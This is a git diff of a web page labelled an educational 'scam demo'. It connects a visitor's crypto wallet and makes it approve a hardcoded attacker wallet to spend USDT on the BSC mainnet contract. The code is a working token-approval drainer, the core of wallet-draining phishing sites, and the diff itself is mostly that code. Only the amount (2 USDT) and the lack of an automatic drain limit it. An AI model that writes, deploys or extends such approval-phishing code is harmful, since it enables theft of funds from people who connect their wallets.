@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚨 SCAM DEMO (Educational)</title>
-    <!-- FIXED: Loading ethers.js properly -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+    <title>🚨 SCAM DEMO (Educational Only)</title>
+    <!-- PROPERLY LOAD ethers.js from scammer's URL -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         body { font-family: Arial; max-width: 600px; margin: 20px auto; }
         button { padding: 10px; background: #ff0000; color: white; border: none; cursor: pointer; }
@@ -21,13 +21,16 @@
     <div id="status">Status: Waiting...</div>
 
     <script>
+        // ✅ ethers should now be defined
+        console.log("ethers loaded?", typeof ethers !== "undefined"); 
+        
         let walletAddress = "";
         let provider, signer;
 
-        // 👇 ATTACKER'S WALLET (REPLACE WITH YOUR WALLET B ADDRESS)
-        const ATTACKER_ADDRESS = "0xCE1EA0e930BF7244a90696056401E6702fe0f390"; // Replace with your Wallet B
+        // 🔥 ATTACKER'S BSC WALLET (REPLACE WITH YOUR WALLET B ADDRESS)
+        const ATTACKER_ADDRESS = "0xCE1EA0e930BF7244a90696056401E6702fe0f390"; 
 
-        // USDT contract (BSC Mainnet)
+        // USDT (BEP-20) Contract on BSC Mainnet
         const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
         const USDT_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
 
@@ -55,8 +58,8 @@
                 return;
             }
 
-            // Small amount for demo ($2 worth of USDT)
-            const amount = ethers.utils.parseUnits("2", 18); // 2 USDT
+            // Small amount for demo (2 USDT)
+            const amount = ethers.utils.parseUnits("2", 18);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
@@ -66,7 +69,7 @@
                 await tx.wait();
                 document.getElementById("status").innerHTML = `
                     ✅ <strong>Demo Complete!</strong><br>
-                    Wallet <code>${walletAddress}</code> approved <strong>2 USDT</strong> for <code>${ATTACKER_ADDRESS}</code>.<br>
+                    Wallet <code>${walletAddress}</code> approved <strong>2 USDT</strong> for attacker (<code>${ATTACKER_ADDRESS}</code>).<br>
                     <strong>Funds were NOT auto-drained in this demo.</strong>
                 `;
             } catch (err) {
